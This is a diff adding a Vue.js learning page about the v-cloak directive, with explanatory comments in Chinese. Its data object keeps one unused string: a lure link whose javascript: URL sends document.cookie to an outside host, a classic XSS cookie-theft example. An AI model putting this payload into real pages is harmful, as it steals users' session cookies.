@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script type="text/javascript" src="../vue/vue.js"></script>
+</head>
+<body>
+    <!-- 
+        本次总结：
+               v-cloak指令(没有值)
+                   1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
+                   2.使用css配合v-cloak可以解决网速慢时页面展示处{{xxx}}(也就是未解析的模版)的问题
+                
+               
+
+                    
+     -->
+    <div class="ming">
+          <div>{{name}}</div>
+    </div>
+     <script>
+         Vue.config.productionTip = false
+         
+        const vm = new Vue({
+            el:'.ming',
+            data:{
+              name:'李明',
+              str:'<h1>明姐我还是想你</h1>',
+              str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟有好东西哟</a>'
+            },
+            
+            
+          })
+     </script>
+    
+</body>
+</html>
